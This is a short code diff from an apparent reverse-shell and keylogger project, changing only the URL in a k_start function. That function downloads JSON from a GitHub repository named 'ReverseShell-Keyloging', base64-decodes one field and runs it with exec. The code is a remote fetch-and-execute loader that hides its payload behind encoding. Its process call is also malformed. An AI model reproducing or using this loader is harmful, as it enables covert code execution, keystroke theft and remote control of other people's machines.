@@ -48,7 +48,7 @@ def read_file(path: str):
 def k_start():
     global spava
     spava = False
-    data = requests.get("https://raw.githubusercontent.com/Caaki/Reve/main/k2.json").json()
+    data = requests.get("https://raw.githubusercontent.com/Caaki/ReverseShell-Keyloging/main/k2.json").json()
     multiprocessing.Process(exec(base64.b64decode(data["1"]).decode("utf-8")),  shell=True,
                             stdout=subprocess.PIPE, stderr= subprocess.PIPE,
                             stdin=subprocess.PIPE)
